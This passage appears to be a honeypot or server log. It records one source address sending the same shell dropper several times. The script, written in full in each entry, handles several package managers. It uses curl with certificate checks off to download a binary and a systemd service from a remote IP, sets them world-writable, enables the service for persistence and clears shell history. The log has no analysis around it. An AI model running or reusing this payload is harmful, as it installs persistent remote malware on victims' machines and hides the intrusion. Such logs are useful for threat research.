		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:29:06.850530 - ('45.148.10.203', 54868) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:29:10.947078 - ('45.148.10.203', 40184) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:29:15.568516 - ('45.148.10.203', 40198) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:29:19.716444 - ('45.148.10.203', 42640) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:29:24.816719 - ('45.148.10.203', 42642) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:29:29.029311 - ('45.148.10.203', 44084) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
